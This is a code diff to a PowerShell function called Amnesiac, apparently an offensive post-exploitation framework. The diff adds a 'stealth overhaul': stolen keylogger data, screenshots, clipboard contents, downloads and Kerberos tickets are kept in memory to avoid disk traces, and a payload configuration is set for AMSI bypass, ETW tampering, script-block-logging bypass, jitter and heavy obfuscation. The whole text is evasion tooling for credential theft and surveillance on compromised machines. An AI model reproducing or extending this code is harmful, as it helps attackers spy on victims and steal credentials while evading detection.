@@ -502,11 +502,7 @@ function Amnesiac {
 	$WarningPreference = "SilentlyContinue"
 	Set-Variable MaximumHistoryCount 32767
 	
-	# Folder Structure Creation
-	$basePath = "C:\Users\Public\Documents\Amnesiac"
-	$subfolders = @("Clipboard", "Downloads", "History", "Keylogger", "Payloads", "Screenshots", "Scripts", "Monitor_TGTs")
-	if (-not (Test-Path $basePath)) {New-Item -Path $basePath -ItemType Directory > $null}
-	$subfolders | ForEach-Object {$subfolderPath = Join-Path -Path $basePath -ChildPath $_;if (-not (Test-Path $subfolderPath)) {New-Item -Path $subfolderPath -ItemType Directory > $null}}
+	Initialize-DiskStructure
 	
 	# Global Variables Setup
 	Remove-Variable -Name FileServerProcess -Scope Global -ErrorAction SilentlyContinue
@@ -527,7 +523,37 @@ function Amnesiac {
 	$global:Message = $null
 	$global:RestoreTimeout = $False
 	$global:ScanModer = $False
-	
+
+    # ---- Stealth overhaul globals ----
+    $global:DiskMode       = $false
+    $global:AmnesiacArtifacts = @{
+        Keylogger   = [System.Collections.Generic.List[string]]::new()
+        Screenshots = [System.Collections.Generic.List[byte[]]]::new()
+        Downloads   = [System.Collections.Generic.Dictionary[string,byte[]]]::new()
+        Clipboard   = [System.Collections.Generic.List[string]]::new()
+        TGTs        = [System.Collections.Generic.List[string]]::new()
+    }
+    $global:ToolCache      = @{}
+    $global:EndMarker      = -join ((65..90 + 97..122) | Get-Random -Count 8 | % {[char]$_})
+    $global:BufferSize     = @(512, 1024, 2048, 4096) | Get-Random
+    $global:PayloadConfig  = @{
+        Amsi        = 'pageguard'
+        Etw         = 'provider'
+        Sbl         = $true
+        Launcher    = 'ps'
+        Encoding    = 'gzip'
+        Jitter      = 'medium'
+        Obfuscation = 'high'
+        Keys        = @{}
+    }
+    $global:EngagementProfile = $null
+    $global:PSKPhrase         = $null
+    $global:PSKBytes          = $null
+    # ---- End stealth overhaul globals ----
+
+    Initialize-ToolCache
+    Show-OpsecBanner
+
 	if(!$ScanMode){$global:Message = " [+] Welcome to Amnesiac. Type 'help' to list/hide available commands"}
 	
 	$ShowSessions = $True
